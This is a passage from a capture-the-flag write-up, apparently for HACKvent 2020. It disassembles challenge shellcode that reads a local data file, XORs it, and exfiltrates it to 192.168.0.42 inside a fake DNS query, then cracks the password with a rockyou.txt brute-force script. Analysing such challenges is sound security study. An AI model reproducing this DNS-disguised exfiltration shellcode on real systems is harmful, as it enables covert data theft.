    0x00007ffff7de9000 0x00007ffff7e0e000 r--p      /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x00007ffff7e0e000 0x00007ffff7f59000 r-xp      /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x00007ffff7f59000 0x00007ffff7fa3000 r--p      /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x00007ffff7fa3000 0x00007ffff7fa4000 ---p      /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x00007ffff7fa4000 0x00007ffff7fa7000 r--p      /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x00007ffff7fa7000 0x00007ffff7faa000 rw-p      /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x00007ffff7faa000 0x00007ffff7fb0000 rw-p      mapped
    0x00007ffff7fcc000 0x00007ffff7fd0000 r--p      [vvar]
    0x00007ffff7fd0000 0x00007ffff7fd2000 r-xp      [vdso]
    0x00007ffff7fd2000 0x00007ffff7fd3000 r--p      /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x00007ffff7fd3000 0x00007ffff7ff3000 r-xp      /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x00007ffff7ff3000 0x00007ffff7ffb000 r--p      /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped
    0x00007ffffffde000 0x00007ffffffff000 rwxp      [stack]
    

I can just run to that point and then `set $rip=[next address on the stack]`
and debug through that. I can also just dump the instructions using `x/50i
[address on stack]`. First, it builds the string `data/santa_data.txt` and
calls `open`:

    
    
       0x7ffe9540a6b0:      push   0x747874               # txt
       0x7ffe9540a6b5:      movabs rdi,0x2e617461645f6174 # ta_data.
       0x7ffe9540a6bf:      push   rdi
       0x7ffe9540a6c0:      movabs rdi,0x6e61732f61746164 # data/san
       0x7ffe9540a6ca:      push   rdi
       0x7ffe9540a6cb:      mov    rdi,rsp
       0x7ffe9540a6ce:      xor    rsi,rsi
       0x7ffe9540a6d1:      xor    rdx,rdx
       0x7ffe9540a6d4:      mov    eax,0x2
       0x7ffe9540a6d9:      syscall                       # open('data/santa_data.txt', 0, 0)
    

Next it reads 32 bytes from that file:

    
    
       0x7ffe9540a6db:      mov    rdi,rax                # fd in rdi
       0x7ffe9540a6de:      movabs rdx,0x100010000
       0x7ffe9540a6e8:      push   rdx
       0x7ffe9540a6e9:      push   0x0
       0x7ffe9540a6eb:      push   0x0
       0x7ffe9540a6ed:      push   0x0
       0x7ffe9540a6ef:      push   0x0
       0x7ffe9540a6f1:      mov    rsi,rsp
       0x7ffe9540a6f4:      movabs rdx,0x2000000000000001
       0x7ffe9540a6fe:      push   rdx
       0x7ffe9540a6ff:      movabs rdx,0x0000013713000000
       0x7ffe9540a709:      push   rdx
       0x7ffe9540a70a:      mov    edx,0x20
       0x7ffe9540a70f:      mov    eax,0x0
       0x7ffe9540a714:      syscall                       # read(fd, RSP, 0x20)
    

The read in data is then xored by 0xdeadbeef:

    
    
       0x7ffe9540a716:      xor    rcx,rcx
       0x7ffe9540a719:      xor    DWORD PTR [rsi+rcx*1],0xdeadbeef
       0x7ffe9540a720:      add    rcx,0x4
       0x7ffe9540a724:      cmp    rcx,0x20
       0x7ffe9540a728:      jne    0x7ffe9540a719
    

It then opens a UDP socket and calls `sendto` sending 50 bytes to 192.168.0.42
on port 53, and then exits:

    
    
       0x7ffe9540a72a:      mov    edi,0x2
       0x7ffe9540a72f:      mov    esi,0x2
       0x7ffe9540a734:      xor    rdx,rdx
       0x7ffe9540a737:      mov    eax,0x29
       0x7ffe9540a73c:      syscall                       # socket(AF_INET = IP, SOCK_DGRAM = 2, 0)
       0x7ffe9540a73e:      mov    rdi,rax                # rdi = sockfd
       0x7ffe9540a741:      mov    rsi,rsp
       0x7ffe9540a744:      add    rsi,0x3
       0x7ffe9540a748:      mov    edx,0x32
       0x7ffe9540a74d:      mov    r10d,0x0
       0x7ffe9540a753:      push   0x0
       0x7ffe9540a755:      movabs r8,0x2a00a8c035000002  # C0A8002A = 192.168.0.42, 0035 = 53
       0x7ffe9540a75f:      push   r8
       0x7ffe9540a761:      mov    r8,rsp
       0x7ffe9540a764:      mov    r9d,0x10
       0x7ffe9540a76a:      mov    eax,0x2c
       0x7ffe9540a76f:      syscall                        # sendto(sockfd, buf = rsp, size = 0x32, flags=0, sockaddr in r8, addrlen = 0x10)
       0x7ffe9540a771:      mov    edi,0x0
       0x7ffe9540a776:      mov    eax,0x3c                # exit(0)
       0x7ffe9540a77b:      syscall
    

It’s important to note that the buffer pointed to in the `sendto` syscall is
RSP, which now has more stuff on top of the stack before the xored buffer,
specifically 13 bytes that make up a fake DNS header, so that the exfilled
data becomes the query. Santa’s data encrypted and then xored by 0xdeadbeef
starts at the 0xe5 at offset 0x37 in this dump from Wireshark:

![image-20201227151655200](https://0xdfimages.gitlab.io/img/image-20201227151655200.png)

I grabbed that data and copied it into a Python terminal. I can remove the xor
with the following:

    
    
    >>> ''.join([f'{x^y:02x}' for x,y in zip(cycle(b'\xef\xbe\xad\xde'), binascii.unhexlify(udpd)[13:45])])
    '0a114843de120e14cea06ea749cd8e8035080d53c16d1a6884eb28a0278a8fa4'
    

Now I have the encrypted version of Santa’s data.

#### Crack Santa’s Password

I can now brute force over rockyou.txt trying each password by generating the
hash, decrypting the data, and seeing if it starts with ‘HV20{‘.

    
    
    santa_data = binascii.unhexlify("0a114843de120e14cea06ea749cd8e8035080d53c16d1a6884eb28a0278a8fa4")
    with open('/usr/share/wordlists/rockyou.txt', 'r') as f:
    #with open('./test', 'r') as f:
        for p in f:
            try:
                ph = gen_hash(p.strip())
                res = decrypt(santa_data, ph)
                if res.startswith("HV20"):
                    print(res)
                    print(p)
                    break
            except:
                pass #import pdb; pdb.set_trace()
    

Because `rockyou.txt` actually has some non-ascii characters in it, I’ll run
in a `try` block to catch errors and continue.

It takes about 12 seconds time find the password and the flag:

    
    
    $ time python3 hash.py 
    HV20{0h_n0es_fl4g_g0t_l34k3d!1}
    xmasrocks
    
    
    real    0m12.019s
    user    0m11.938s
    sys     0m0.025s
    

**Flag:`HV20{0h_n0es_fl4g_g0t_l34k3d!1}`**

[](/hackvent2020/leet)

